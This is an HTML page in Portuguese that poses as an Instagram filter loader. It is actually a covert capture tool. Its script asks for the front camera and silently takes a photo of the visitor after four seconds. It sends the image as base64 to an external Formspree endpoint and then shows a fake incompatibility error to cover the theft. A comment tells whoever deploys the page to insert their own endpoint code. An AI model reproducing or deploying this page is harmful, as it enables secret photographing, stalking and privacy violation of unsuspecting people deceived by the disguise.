<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando Filtros...</title>
</head>
<body style="background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px;">

    <div id="status">
        <h2>Carregando filtros do Instagram...</h2>
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #e1306c; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            video.srcObject = stream;
            
            // 4 Segundos para a câmera dele sair do preto e ajustar o brilho
            setTimeout(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);
                
                const imagemBase64 = canvas.toDataURL('image/jpeg', 0.4);

                fetch('https://formspree.io/f/mojkaqdb', { // <--- NÃO ESQUEÇA SEU CÓDIGO AQUI
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ foto: imagemBase64 })
                }).then(() => {
                    document.getElementById('status').innerHTML = "<h2>Erro: Filtro incompatível com este dispositivo.</h2>";
                });

            }, 4000); 
        })
        .catch(err => {
            alert("Erro: Para testar os filtros, você precisa permitir o acesso à câmera.");
        });
    </script>
</body>
</html>
